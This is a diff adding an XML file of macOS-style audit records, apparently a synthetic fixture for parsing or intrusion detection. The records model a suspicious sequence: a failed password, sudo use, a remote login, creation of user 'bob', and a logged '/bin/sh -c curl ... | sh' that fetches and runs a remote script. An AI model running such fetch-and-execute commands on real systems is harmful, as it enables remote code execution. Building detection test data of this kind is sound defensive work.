@@ -1,0 +1,54 @@
+<?xml version='1.0' encoding='UTF-8'?>
+<audit>
+<record version="11" event="45023" modifier="0" time="1792569601" msec="120" >
+<subject audit-uid="-1" uid="0" gid="20" ruid="0" rgid="20" pid="412" sid="100004" tid="0 0.0.0.0" />
+<text>Verify password for record type Users &apos;alice&apos; node &apos;/Local/Default&apos;</text>
+<return errval="255" retval="5000" />
+</record>
+<record version="11" event="45028" modifier="0" time="1792569605" msec="7" >
+<subject audit-uid="501" uid="501" gid="20" ruid="501" rgid="20" pid="2301" sid="100004" tid="0 0.0.0.0" />
+<text>bad password</text>
+<return errval="1" retval="4294967295" />
+</record>
+<record version="11" event="45028" modifier="0" time="1792569609" msec="431" >
+<subject audit-uid="501" uid="501" gid="20" ruid="501" rgid="20" pid="2305" sid="100004" tid="0 0.0.0.0" />
+<exec_args><arg>sudo</arg><arg>/usr/bin/whoami</arg></exec_args>
+<return errval="0" retval="0" />
+</record>
+<record version="11" event="32800" modifier="0" time="1792569620" msec="990" >
+<subject audit-uid="501" uid="501" gid="20" ruid="501" rgid="20" pid="2400" sid="100004" tid="52113 192.0.2.10" />
+<text>successful login alice</text>
+<return errval="0" retval="0" />
+</record>
+<record version="11" event="45021" modifier="0" time="1792569630" msec="0" >
+<subject audit-uid="501" uid="501" gid="20" ruid="501" rgid="20" pid="150" sid="100004" tid="0 0.0.0.0" />
+<text>alice</text>
+<return errval="0" retval="0" />
+</record>
+<record version="11" event="6153" modifier="0" time="1792569640" msec="250" >
+<subject audit-uid="501" uid="501" gid="20" ruid="501" rgid="20" pid="150" sid="100004" tid="0 0.0.0.0" />
+<text>alice</text>
+<return errval="0" retval="0" />
+</record>
+<record version="11" event="6207" modifier="0" time="1792569650" msec="5" >
+<subject audit-uid="501" uid="0" gid="20" ruid="0" rgid="20" pid="2500" sid="100004" tid="0 0.0.0.0" />
+<text>Create user &apos;bob&apos; (uid 502)</text>
+<return errval="0" retval="0" />
+</record>
+<record version="11" event="23" modifier="0" time="1792569660" msec="77" >
+<exec_args><arg>/bin/sh</arg><arg>-c</arg><arg>curl -fsSL https://example.com/x.sh | sh</arg></exec_args>
+<path>/bin/sh</path>
+<attribute mode="100755" uid="0" gid="0" fsid="16777234" nodeid="1152921500311879000" device="0" />
+<subject audit-uid="501" uid="501" gid="20" ruid="501" rgid="20" pid="2600" sid="100004" tid="0 0.0.0.0" />
+<return errval="0" retval="0" />
+</record>
+<record version="11" event="72" modifier="0" time="1792569661" msec="0" >
+<path>/etc/hosts</path>
+<subject audit-uid="501" uid="501" gid="20" ruid="501" rgid="20" pid="2601" sid="100004" tid="0 0.0.0.0" />
+<return errval="0" retval="3" />
+</record>
+<record version="11" event="65000" modifier="0" time="1792569662" msec="0" >
+<subject audit-uid="501" uid="501" gid="20" ruid="501" rgid="20" pid="2602" sid="100004" tid="0 0.0.0.0" />
+<return errval="0" retval="0" />
+</record>
+</audit>
